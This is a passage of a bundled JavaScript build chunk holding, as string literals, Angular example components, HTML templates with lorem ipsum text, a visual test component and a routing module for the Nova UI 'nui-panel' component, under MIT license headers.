vitae, elementum amet enim.\n                Pellentesque et facilisis leo, sit amet rhoncus magna. Integer\n                commodo lobortis arcu et bibendum. Pellentesque sagittis magna\n                sed tellus volutpat, sed eleifend justo ornare. Fusce porttitor\n                laoreet dui a mollis.\n            </p>\n        </div>\n    </nui-panel>\n</div>\n'},63733:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-panel-resize-example",\n    templateUrl: "./panel-resize.example.component.html",\n})\nexport class PanelResizeExampleComponent {}\n'},30111:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div>\n    <nui-panel\n        id="nui-demo-size-panel"\n        orientation="right"\n        paneMinSize="150px"\n        paneMaxSize="550px"\n        paneSize="350px"\n    >\n        <div nuiPanelEmbeddedBody>\n            <div>\n                <p i18n>\n                    Lorem ipsum dolor sit amet, consectetur adipiscing elit.\n                    Integer quam nibh, tincidunt non massa quis, efficitur\n                    porttitor lacus. In quis tellus euismod, tincidunt libero\n                    quis, suscipit nunc. Nulla ac mattis tortor, quis iaculis\n                    sapien.\n                </p>\n            </div>\n        </div>\n        <div>\n            <p i18n>\n                Lorem ipsum dolor sit amet, consectetur adipiscing elit. Donec\n                efficitur rutrum lacus id vulputate. Integer eu ex eu augue\n                efficitur luctus quis ac elit. Nam odio est, iaculis nec varius\n                id, congue erat. Nullam mi lectus, gravida quis pretium sit\n                amet, accumsan non elit. In tempus commodo sem ac vulputate. Sed\n                vel sagittis purus. Integer non ornare felis. Sed aliquam, purus\n                et euismod tincidunt, felis ligula fermentum mi, eget commodo\n                nisl orci efficitur dui. Etiam interdum justo magna consequat,\n                vitae hendrerit mi aliquam. Sed non ex eu purus ornare lobortis\n                tempus id est. Aenean dictum at dui sit amet mollis. Phasellus\n                mauris arcu, blandit id congue vitae, elementum amet enim.\n                Pellentesque et facilisis leo, sit amet rhoncus magna. Integer\n                commodo lobortis arcu et bibendum. Pellentesque sagittis magna\n                sed tellus volutpat, sed eleifend justo ornare. Fusce porttitor\n                laoreet dui a mollis.\n            </p>\n        </div>\n    </nui-panel>\n</div>\n'},95783:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-panel-size-example",\n    templateUrl: "./panel-size.example.component.html",\n})\nexport class PanelSizeExampleComponent {}\n'},23505:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="container">\n    <nui-panel-basic-example></nui-panel-basic-example>\n\n    <nui-panel-collapse-example></nui-panel-collapse-example>\n\n    <nui-panel-float-example></nui-panel-float-example>\n\n    <nui-panel-resize-example></nui-panel-resize-example>\n\n    <nui-panel-hide-example></nui-panel-hide-example>\n</div>\n'},66589:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-panel-test",\n    templateUrl: "./panel-test.component.html",\n})\nexport class PanelTestComponent {}\n'},52617:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="container">\n    <details>\n        <summary id="nui-visual-basic-panel-details">Basic Panel</summary>\n        <nui-panel id="nui-visual-test-basic-panel">\n            <div nuiPanelEmbeddedBody>\n                <div>\n                    <p>\n                        Lorem ipsum dolor sit amet, consectetur adipiscing elit.\n                        Integer quam nibh, tincidunt non massa quis, efficitur\n                        porttitor lacus. In quis tellus euismod, tincidunt\n                        libero quis, suscipit nunc. Nulla ac mattis tortor, quis\n                        iaculis sapien.\n                    </p>\n                </div>\n            </div>\n            <div>\n                <p>\n                    Lorem ipsum dolor sit amet, consectetur adipiscing elit.\n                    Donec efficitur rutrum lacus id vulputate. Integer eu ex eu\n                    augue efficitur luctus quis ac elit. Nam odio est, iaculis\n                    nec varius id, congue erat. Nullam mi lectus, gravida quis\n                    pretium sit amet, accumsan non elit. In tempus commodo sem\n                    ac vulputate. Sed vel sagittis purus. Integer non ornare\n                    felis. Sed aliquam, purus et euismod tincidunt, felis ligula\n                    fermentum mi, eget commodo nisl orci efficitur dui. Etiam\n                    interdum justo magna consequat, vitae hendrerit mi aliquam.\n                    Sed non ex eu purus ornare lobortis tempus id est. Aenean\n                    dictum at dui sit ameAt mollis. Phasellus mauris arcu,\n                    blandit id congue vitae, elementum amet enim. Pellentesque\n                    et facilisis leo, sit amet rhoncus magna. Integer commodo\n                    lobortis arcu et bibendum. Pellentesque sagittis magna sed\n                    tellus volutpat, sed eleifend justo ornare. Fusce porttitor\n                    laoreet dui a mollis.\n                </p>\n            </div>\n        </nui-panel>\n        <hr />\n    </details>\n\n    <details>\n        <summary id="nui-visual-custom-size-panel-details">\n            Panel With Custom Sizes\n        </summary>\n        <nui-panel\n            id="nui-visual-test-size-panel"\n            orientation="right"\n            paneMinSize="150px"\n            paneMaxSize="550px"\n            paneSize="350px"\n        >\n            <div nuiPanelEmbeddedBody>\n                <div>\n                    <p>\n                        Lorem ipsum dolor sit amet, consectetur adipiscing elit.\n                        Integer quam nibh, tincidunt non massa quis, efficitur\n                        porttitor lacus. In quis tellus euismod, tincidunt\n                        libero quis, suscipit nunc. Nulla ac mattis tortor, quis\n                        iaculis sapien.\n                    </p>\n                </div>\n            </div>\n            <div>\n                <p>\n                    Lorem ipsum dolor sit amet, consectetur adipiscing elit.\n                    Donec efficitur rutrum lacus id vulputate. Integer eu ex eu\n                    augue efficitur luctus quis ac elit. Nam odio est, iaculis\n                    nec varius id, congue erat. Nullam mi lectus, gravida quis\n                    pretium sit amet, accumsan non elit. In tempus commodo sem\n                    ac vulputate. Sed vel sagittis purus. Integer non ornare\n                    felis. Sed aliquam, purus et euismod tincidunt, felis ligula\n                    fermentum mi, eget commodo nisl orci efficitur dui. Etiam\n                    interdum justo magna consequat, vitae hendrerit mi aliquam.\n                    Sed non ex eu purus ornare lobortis tempus id est. Aenean\n                    dictum at dui sit amet mollis. Phasellus mauris arcu,\n                    blandit id congue vitae, elementum amet enim. Pellentesque\n                    et facilisis leo, sit amet rhoncus magna. Integer commodo\n                    lobortis arcu et bibendum. Pellentesque sagittis magna sed\n                    tellus volutpat, sed eleifend justo ornare. Fusce porttitor\n                    laoreet dui a mollis.\n                </p>\n            </div>\n        </nui-panel>\n        <hr />\n    </details>\n\n    <details>\n        <summary id="nui-visual-hoverable-panel-details">\n            Hoverable Mode\n        </summary>\n        <nui-panel\n            panelMode="hoverable"\n            orientation="left"\n            [displacePrimaryContent]="false"\n            id="nui-visual-test-hoverable-panel"\n        >\n            <div nuiPanelEmbeddedBody>\n                <div>\n                    <p>\n                        Lorem ipsum dolor sit amet, consectetur adipiscing elit.\n                        Integer quam nibh, tincidunt non massa quis, efficitur\n                        porttitor lacus. In quis tellus euismod, tincidunt\n                        libero quis, suscipit nunc. Nulla ac mattis tortor, quis\n                        iaculis sapien.\n                    </p>\n                </div>\n            </div>\n            <div>\n                <p>\n                    Lorem ipsum dolor sit amet, consectetur adipiscing elit.\n                    Donec efficitur rutrum lacus id vulputate. Integer eu ex eu\n                    augue efficitur luctus quis ac elit. Nam odio est, iaculis\n                    nec varius id, congue erat. Nullam mi lectus, gravida quis\n                    pretium sit amet, accumsan non elit. In tempus commodo sem\n                    ac vulputate. Sed vel sagittis purus. Integer non ornare\n                    felis. Sed aliquam, purus et euismod tincidunt, felis ligula\n                    fermentum mi, eget commodo nisl orci efficitur dui. Etiam\n                    interdum justo magna consequat, vitae hendrerit mi aliquam.\n                    Sed non ex eu purus ornare lobortis tempus id est. Aenean\n                    dictum at dui sit amet mollis. Phasellus mauris arcu,\n                    blandit id congue vitae, elementum amet enim. Pellentesque\n                    et facilisis leo, sit amet rhoncus magna. Integer commodo\n                    lobortis arcu et bibendum. Pellentesque sagittis magna sed\n                    tellus volutpat, sed eleifend justo ornare. Fusce porttitor\n                    laoreet dui a mollis.\n                </p>\n            </div>\n        </nui-panel>\n        <hr />\n    </details>\n\n    <details>\n        <summary id="nui-visual-closable-panel-details">Closable Panel</summary>\n        <nui-panel\n            orientation="left"\n            panelMode="closable"\n            heading="panel header"\n            id="nui-visual-test-hidden-panel"\n        >\n            <div nuiPanelEmbeddedBody>\n                <div>\n                    <p>\n                        Lorem ipsum dolor sit amet, consectetur adipiscing elit.\n                        Integer quam nibh, tincidunt non massa quis, efficitur\n                        porttitor lacus. In quis tellus euismod, tincidunt\n                        libero quis, suscipit nunc. Nulla ac mattis tortor, quis\n                        iaculis sapien.\n                    </p>\n                </div>\n            </div>\n            <div>\n                <p>\n                    Lorem ipsum dolor sit amet, consectetur adipiscing elit.\n                    Donec efficitur rutrum lacus id vulputate. Integer eu ex eu\n                    augue efficitur luctus quis ac elit. Nam odio est, iaculis\n                    nec varius id, congue erat. Nullam mi lectus, gravida quis\n                    pretium sit amet, accumsan non elit. In tempus commodo sem\n                    ac vulputate. Sed vel sagittis purus. Integer non ornare\n                    felis. Sed aliquam, purus et euismod tincidunt, felis ligula\n                    fermentum mi, eget commodo nisl orci efficitur dui. Etiam\n                    interdum justo magna consequat, vitae hendrerit mi aliquam.\n                    Sed non ex eu purus ornare lobortis tempus id est. Aenean\n                    dictum at dui sit amet mollis. Phasellus mauris arcu,\n                    blandit id congue vitae, elementum amet enim. Pellentesque\n                    et facilisis leo, sit amet rhoncus magna. Integer commodo\n                    lobortis arcu et bibendum. Pellentesque sagittis magna sed\n                    tellus volutpat, sed eleifend justo ornare. Fusce porttitor\n                    laoreet dui a mollis.\n                </p>\n            </div>\n            <div nuiPanelEmbeddedFooter class="font-weight-bold">\n                EMBEDDED FOOTER\n            </div>\n        </nui-panel>\n        <hr />\n    </details>\n\n    <details>\n        <summary id="nui-visual-with-embedded-details">\n            Panel\'s Collapsible Mode With Embedded Content\n        </summary>\n        <div>\n            <button\n                type="button"\n                id="nui-visual-test-panel-footer-toggle-btn"\n                (click)="toggleFooter()"\n            >\n                Toggle Footer\n            </button>\n            <div>\n                <nui-panel\n                    panelMode="collapsible"\n                    id="nui-visual-test-embedded-content-panel"\n                    orientation="left"\n                    [isCollapsed]="false"\n                    (collapsed)="onCollapseChange($event)"\n                >\n                    <div nuiPanelEmbeddedIcon>\n                        <nui-icon\n                            *ngIf="isCollapsed"\n                            [icon]="headerIcon"\n                            [counter]="headerIconCounter"\n                        >\n                        </nui-icon>\n                    </div>\n                    <div\n                        nuiPanelEmbeddedHeading\n                        class="d-flex flex-row align-items-center"\n                    >\n                        <nui-icon\n                            *ngIf="!isCollapsed"\n                            [icon]="headerIcon"\n                            iconColor="gray"\n                        >\n                        </nui-icon>\n                        <span>\n                            <h4 class="my-0">TRANSCLUDED</h4>\n                        </span>\n                    </div>\n                    <div nuiPanelEmbeddedBody>\n                        <div>\n                            <p>\n                                Lorem ipsum dolor sit amet, consectetur\n                                adipiscing elit. Integer quam nibh, tincidunt\n                                non massa quis, efficitur porttitor lacus. In\n                                quis tellus euismod, tincidunt libero quis,\n                                suscipit nunc. Nulla ac mattis tortor, quis\n                                iaculis sapien.\n                            </p>\n                        </div>\n                    </div>\n                    <div>\n                        <p>\n                            Lorem ipsum dolor sit amet, consectetur adipiscing\n                            elit. Donec efficitur rutrum lacus id vulputate.\n                            Integer eu ex eu augue efficitur luctus quis ac\n                            elit. Nam odio est, iaculis nec varius id, congue\n                            erat. Nullam mi lectus, gravida quis pretium sit\n                            amet, accumsan non elit. In tempus commodo sem ac\n                            vulputate. Sed vel sagittis purus. Integer non\n                            ornare felis. Sed aliquam, purus et euismod\n                            tincidunt, felis ligula fermentum mi, eget commodo\n                            nisl orci efficitur dui. Etiam interdum justo magna\n                            consequat, vitae hendrerit mi aliquam. Sed non ex eu\n                            purus ornare lobortis tempus id est. Aenean dictum\n                            at dui sit amet mollis. Phasellus mauris arcu,\n                            blandit id congue vitae, elementum amet enim.\n                            Pellentesque et facilisis leo, sit amet rhoncus\n                            magna. Integer commodo lobortis arcu et bibendum.\n                            Pellentesque sagittis magna sed tellus volutpat, sed\n                            eleifend justo ornare. Fusce porttitor laoreet dui a\n                            mollis.\n                        </p>\n                    </div>\n                    <div\n                        *ngIf="displayFooter"\n                        nuiPanelEmbeddedFooter\n                        class="d-flex justify-content-between"\n                    >\n                        <button nui-button type="button">Cancel</button>\n                        <button nui-button type="button" displayStyle="primary">\n                            Confirm\n                        </button>\n                    </div>\n                </nui-panel>\n            </div>\n        </div>\n        <hr />\n    </details>\n\n    <details>\n        <summary id="nui-visual-custom-style-panel-details">\n            Custom Styles\n        </summary>\n        <nui-panel\n            id="nui-visual-test-custom-styles-panel"\n            orientation="left"\n            panelMode="collapsible"\n            [darkBorder]="true"\n            [headerPadding]="false"\n            [panelBackgroundColor]="panelColor"\n        >\n            <div\n                nuiPanelEmbeddedHeading\n                class="d-flex flex-row align-items-center w-100"\n            >\n                <span class="ml-1">\n                    <h4>Custom Heading</h4>\n                </span>\n                <div class="ml-auto">\n                    <nui-menu\n                        displayStyle="action"\n                        [itemsSource]="itemsSource"\n                        icon="menu"\n                    ></nui-menu>\n                </div>\n            </div>\n            <div nuiPanelEmbeddedBody>\n                <div>\n                    <p>\n                        Sed vel sagittis purus. Integer non ornare felis. Sed\n                        aliquam, purus et euismod tincidunt, felis ligula\n                        fermentum mi, eget commodo nisl orci efficitur dui.\n                        Etiam interdum justo magna consequat, vitae hendrerit mi\n                        aliquam. Sed non ex eu purus ornare lobortis tempus id\n                        est. Aenean dictum at dui sit amet mollis.\n                    </p>\n                </div>\n            </div>\n            <div>\n                <p>\n                    Lorem ipsum dolor sit amet, consectetur adipiscing elit.\n                    Donec efficitur rutrum lacus id vulputate. Integer eu ex eu\n                    augue efficitur luctus quis ac elit. Nam odio est, iaculis\n                    nec varius id, congue erat. Nullam mi lectus, gravida quis\n                    pretium sit amet, accumsan non elit. In tempus commodo sem\n                    ac vulputate. Sed vel sagittis purus. Integer non ornare\n                    felis. Sed aliquam, purus et euismod tincidunt, felis ligula\n                    fermentum mi, eget commodo nisl orci efficitur dui. Etiam\n                    interdum justo magna consequat, vitae hendrerit mi aliquam.\n                    Sed non ex eu purus ornare lobortis tempus id est. Aenean\n                    dictum at dui sit amet mollis. Phasellus mauris arcu,\n                    blandit id congue vitae, elementum amet enim. Pellentesque\n                    et facilisis leo, sit amet rhoncus magna. Integer commodo\n                    lobortis arcu et bibendum. Pellentesque sagittis magna sed\n                    tellus volutpat, sed eleifend justo ornare. Fusce porttitor\n                    laoreet dui a mollis.\n                </p>\n            </div>\n        </nui-panel>\n        <hr />\n    </details>\n\n    <details>\n        <summary id="nui-visual-resizable-details">Resizable Panel</summary>\n        <nui-panel\n            id="nui-visual-test-resizable-panel"\n            panelMode="collapsible"\n            isResizable="true"\n            heading="Panel Header"\n            paneSize="20%"\n        >\n            <div nuiPanelEmbeddedBody>\n                <div>\n                    <p>\n                        Lorem ipsum dolor sit amet, consectetur adipiscing elit.\n                        Integer quam nibh, tincidunt non massa quis, efficitur\n                        porttitor lacus. In quis tellus euismod, tincidunt\n                        libero quis, suscipit nunc. Nulla ac mattis tortor, quis\n                        iaculis sapien.\n                    </p>\n                </div>\n            </div>\n            <div>\n                <p>\n                    Lorem ipsum dolor sit amet, consectetur adipiscing elit.\n                    Donec efficitur rutrum lacus id vulputate. Integer eu ex eu\n                    augue efficitur luctus quis ac elit. Nam odio est, iaculis\n                    nec varius id, congue erat. Nullam mi lectus, gravida quis\n                    pretium sit amet, accumsan non elit. In tempus commodo sem\n                    ac vulputate. Sed vel sagittis purus. Integer non ornare\n                    felis. Sed aliquam, purus et euismod tincidunt, felis ligula\n                    fermentum mi, eget commodo nisl orci efficitur dui. Etiam\n                    interdum justo magna consequat, vitae hendrerit mi aliquam.\n                    Sed non ex eu purus ornare lobortis tempus id est. Aenean\n                    dictum at dui sit amet mollis. Phasellus mauris arcu,\n                    blandit id congue vitae, elementum amet enim. Pellentesque\n                    et facilisis leo, sit amet rhoncus magna. Integer commodo\n                    lobortis arcu et bibendum. Pellentesque sagittis magna sed\n                    tellus volutpat, sed eleifend justo ornare. Fusce porttitor\n                    laoreet dui a mollis.\n                </p>\n            </div>\n        </nui-panel>\n        <hr />\n    </details>\n\n    <details>\n        <summary id="nui-visual-top-oriented-panel-details">\n            Top Oriented Collapsible Mode\n        </summary>\n        <nui-panel\n            panelMode="collapsible"\n            orientation="top"\n            id="nui-visual-test-top-oriented-panel"\n        >\n            <div nuiPanelEmbeddedHeading class="d-flex align-items-center">\n                <nui-menu\n                    displayStyle="action"\n                    [itemsSource]="itemsSource"\n                    icon="menu"\n                ></nui-menu>\n                <span class="ml-1">\n                    <h4 class="my-0">Path History</h4>\n                </span>\n            </div>\n            <div nuiPanelEmbeddedBody>\n                <div>\n                    <p>\n                        Integer eu ex eu augue efficitur luctus quis ac elit.\n                        Nam odio est, iaculis nec varius id, congueerat. Nullam\n                        mi lectus, gravida quis pretium sit amet, accumsan non\n                        elit. In tempus commodo sem ac vulputate. Sed vel\n                        sagittis purus. Integer non ornare felis. Sed aliquam,\n                        purus et euismodtincidunt, felis ligula fermentum mi,\n                        eget commodo nisl orci efficitur dui. Etiam interdum\n                        justo magna consequat, vitae hendrerit mi aliquam.\n                    </p>\n                </div>\n            </div>\n            <div>\n                <p>\n                    Lorem ipsum dolor sit amet, consectetur adipiscing elit.\n                    Donec efficitur rutrum lacus id vulputate. Integer eu ex eu\n                    augue efficitur luctus quis ac elit. Nam odio est, iaculis\n                    nec varius id, congue erat. Nullam mi lectus, gravida quis\n                    pretium sit amet, accumsan non elit. In tempus commodo sem\n                    ac vulputate. Sed vel sagittis purus. Integer non ornare\n                    felis. Sed aliquam, purus et euismod tincidunt, felis ligula\n                    fermentum mi, eget commodo nisl orci efficitur dui. Etiam\n                    interdum justo magna consequat, vitae hendrerit mi aliquam.\n                    Sed non ex eu purus ornare lobortis tempus id est. Aenean\n                    dictum at dui sit amet mollis. Phasellus mauris arcu,\n                    blandit id congue vitae, elementum amet enim. Pellentesque\n                    et facilisis leo, sit amet rhoncus magna. Integer commodo\n                    lobortis arcu et bibendum. Pellentesque sagittis magna sed\n                    tellus volutpat, sed eleifend justo ornare. Fusce porttitor\n                    laoreet dui a mollis.\n                </p>\n            </div>\n        </nui-panel>\n        <hr />\n    </details>\n\n    <details>\n        <summary id="nui-visual-nested-panel-details">Nested Panels</summary>\n        <nui-panel\n            panelMode="collapsible"\n            orientation="left"\n            [isCollapsed]="false"\n            id="nui-visual-test-nested-panel-outer"\n        >\n            <div\n                nuiPanelEmbeddedHeading\n                class="flex flex-row align-items-center"\n            >\n                <span>\n                    <h4 i18n class="my-0">Outer Panel</h4>\n                </span>\n            </div>\n            <div nuiPanelEmbeddedBody>\n                <div>\n                    <p i18n>\n                        Lorem ipsum dolor sit amet, consectetur adipiscing elit.\n                        Integer quam nibh, tincidunt non massa quis, efficitur\n                        porttitor lacus. In quis tellus euismod, tincidunt\n                        libero quis, suscipit nunc. Nulla ac mattis tortor, quis\n                        iaculis sapien.\n                    </p>\n                </div>\n            </div>\n            <div>\n                <nui-panel\n                    class="w-100"\n                    panelMode="collapsible"\n                    orientation="left"\n                    [isCollapsed]="false"\n                >\n                    <div\n                        nuiPanelEmbeddedHeading\n                        class="flex flex-row align-items-center"\n                    >\n                        <span>\n                            <h4 i18n class="my-0">Inner Panel</h4>\n                        </span>\n                    </div>\n                    <div nuiPanelEmbeddedBody>\n                        <div>\n                            <p i18n>\n                                Lorem ipsum dolor sit amet, consectetur\n                                adipiscing elit. Integer quam nibh, tincidunt\n                                non massa quis, efficitur porttitor lacus. In\n                                quis tellus euismod, tincidunt libero quis,\n                                suscipit nunc. Nulla ac mattis tortor, quis\n                                iaculis sapien.\n                            </p>\n                        </div>\n                    </div>\n                    <div>\n                        <p i18n>\n                            Lorem ipsum dolor sit amet, consectetur adipiscing\n                            elit. Donec efficitur rutrum lacus id vulputate.\n                            Integer eu ex eu augue efficitur luctus quis ac\n                            elit. Nam odio est, iaculis nec varius id, congue\n                            erat. Nullam mi lectus, gravida quis pretium sit\n                            amet, accumsan non elit. In tempus commodo sem ac\n                            vulputate. Sed vel sagittis purus. Integer non\n                            ornare felis. Sed aliquam, purus et euismod\n                            tincidunt, felis ligula fermentum mi, eget commodo\n                            nisl orci efficitur dui. Etiam interdum justo magna\n                            consequat, vitae hendrerit mi aliquam. Sed non ex eu\n                            purus ornare lobortis tempus id est. Aenean dictum\n                            at dui sit amet mollis. Phasellus mauris arcu,\n                            blandit id congue vitae, elementum amet enim.\n                            Pellentesque et facilisis leo, sit amet rhoncus\n                            magna. Integer commodo lobortis arcu et bibendum.\n                            Pellentesque sagittis magna sed tellus volutpat, sed\n                            eleifend justo ornare. Fusce porttitor laoreet dui a\n                            mollis.\n                        </p>\n                    </div>\n                </nui-panel>\n            </div>\n        </nui-panel>\n        <hr />\n    </details>\n</div>\n'},99333:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, Input } from "@angular/core";\n\nimport { IMenuGroup, PanelBackgroundColor } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-panel-visual-test",\n    templateUrl: "./panel-visual-test.component.html",\n})\nexport class PanelVisualTestComponent {\n    @Input() isOn = true;\n    public isCollapsible = true;\n    public isCollapsed = false;\n    public headerIcon = "filter";\n    public headerIconCounter = 7;\n    public displayFooter = true;\n    public panelColor: PanelBackgroundColor =\n        PanelBackgroundColor.colorBgSecondary;\n    public heading = "No Padding Header";\n    public itemsSource: IMenuGroup[] = [\n        {\n            header: "section title",\n            itemsSource: [\n                { title: "Menu Item", itemType: "action" },\n                { title: "Hover me", itemType: "action" },\n                { title: "Selected menu item", isSelected: true },\n                { title: "Menu item", itemType: "switch", checked: true },\n                {\n                    title: "Menu disabled item",\n                    itemType: "switch",\n                    checked: false,\n                    disabled: true,\n                },\n                {\n                    title: "Menu item with checkbox",\n                    itemType: "option",\n                    disabled: true,\n                },\n                {\n                    title: "Menu item with icon",\n                    itemType: "action",\n                    icon: "table",\n                },\n                {\n                    title: "Link menu item",\n                    itemType: "link",\n                    url: "#button",\n                    disabled: true,\n                },\n                {\n                    title: "Export PDF",\n                    itemType: "link",\n                    icon: "export-pdf",\n                    url: "#button",\n                },\n            ],\n        },\n    ];\n\n    constructor() {}\n\n    public toggleFooter(): void {\n        this.displayFooter = !this.displayFooter;\n    }\n\n    public onCollapseChange($event: boolean): void {\n        this.isCollapsed = $event;\n    }\n}\n'},5079:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { NgModule } from "@angular/core";\nimport { RouterModule } from "@angular/router";\n\nimport {\n    DEMO_PATH_TOKEN,\n    NuiButtonModule,\n    NuiDocsModule,\n    NuiIconModule,\n    NuiMenuModule,\n    NuiMessageModule,\n    NuiPanelModule,\n    NuiSwitchModule,\n    SrlcStage,\n} from "@nova-ui/bits";\n\nimport {\n    PanelBasicExampleComponent,\n    PanelCollapseExampleComponent,\n    PanelCollapseOutsideControlExampleComponent,\n    PanelCollapseTopOrientedExampleComponent,\n    PanelCustomStylesExampleComponent,\n    PanelDocsExampleComponent,\n    PanelEmbeddedContentExampleComponent,\n    PanelFloatExampleComponent,\n    PanelHideExampleComponent,\n    PanelHideOutsideControlExampleComponent,\n    PanelHoverableExampleComponent,\n    PanelNestedExampleComponent,\n    PanelPositionExampleComponent,\n    PanelResizeExampleComponent,\n    PanelSizeExampleComponent,\n    PanelVisualTestComponent,\n    PanelTestComponent,\n} from "./index";\nimport { getDemoFiles } from "../../../static/demo-files-factory";\n\nconst routes = [\n    {\n        path: "",\n        component: PanelDocsExampleComponent,\n        data: {\n            srlc: {\n                stage: SrlcStage.ga,\n            },\n            showThemeSwitcher: true,\n        },\n    },\n    {\n        path: "panel-visual-test",\n        component: PanelVisualTestComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n    {\n        path: "panel-test",\n        component: PanelTestComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n    {\n        path: "basic",\n        component: PanelBasicExampleComponent,\n        data: {\n            srlc: 